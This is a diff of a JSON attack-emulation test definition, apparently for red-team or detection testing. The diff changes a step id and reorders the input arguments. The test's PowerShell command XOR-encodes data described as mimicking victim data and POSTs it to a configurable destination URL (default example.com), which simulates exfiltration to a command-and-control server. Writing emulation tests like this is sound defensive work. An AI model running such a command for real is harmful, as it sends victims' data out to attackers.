@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "307cb645-6df8-4ab7-ab60-2fce974837d0",
+      "id": "924ddffe-aa5a-41e3-84e7-467a0928250d",
       "type": "execute-command",
       "data": {
         "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n",
@@ -22,12 +22,6 @@
   ],
   "input_arguments": [
     {
-      "name": "destination_url",
-      "type": "url",
-      "description": "Destination URL to post encoded data.",
-      "value": "example.com"
-    },
-    {
       "name": "plaintext",
       "type": "string",
       "description": "Plain text mimicking victim data sent to C2 server.",
@@ -38,6 +32,12 @@
       "type": "string",
       "description": "XOR key used for encoding the plaintext.",
       "value": "abcdefghijklmnopqrstuvwxyz123456"
+    },
+    {
+      "name": "destination_url",
+      "type": "url",
+      "description": "Destination URL to post encoded data.",
+      "value": "example.com"
     }
   ]
 }
